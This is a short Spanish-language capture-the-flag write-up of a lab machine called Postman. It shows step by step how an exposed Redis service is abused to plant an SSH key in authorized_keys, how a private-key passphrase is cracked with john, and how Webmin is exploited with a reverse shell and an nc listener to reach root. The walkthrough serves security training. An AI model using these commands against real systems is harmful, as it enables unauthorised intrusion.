Postman

Redis expuesto, pivote SSH y escalada por Webmin

Dificultad: Media · Objetivo: root

Resumen técnico

El vector inicial se apoya en un servicio Redis accesible sin controles suficientes. Aprovechando capacidades de escritura, se inyecta una clave pública SSH en authorized_keys del usuario redis, logrando acceso al sistema. Posteriormente se recupera una llave privada cifrada en /opt, se crackea su passphrase y se pivotea a Matt, cuenta que permite comprometer Webmin y terminar en root.

1) Enumeración y abuso de Redis

El escaneo reveló 22, 80, 6379 y 10000. El puerto 6379 permitió conexión con redis-cli y modificación de dir/dbfilename para escribir una clave en el archivo de autorización SSH. 

(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
redis-cli -h 10.129.2.1
config set dir /var/lib/redis/.ssh
config set dbfilename authorized_keys
save

Con esto se obtuvo shell como redis por SSH.

2) Pivote al usuario Matt

En /opt/id_rsa.bak apareció una clave privada cifrada. Se extrajo hash con ssh2john y se crackeó con john, recuperando la passphrase computer2008. 

ssh2john id_rsaMatt > hashMatt
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashMatt
ssh -i id_rsaMatt matt@10.129.2.1

3) Escalada final por Webmin

Con credenciales de Matt se accedió a Webmin (10000/tcp) y se ejecutó un script de explotación con reverse shell codificada en base64. Tras levantar listener, la ejecución entregó shell con privilegios de root. 

nc -lvnp 4444
python3 webmin_exploit.py
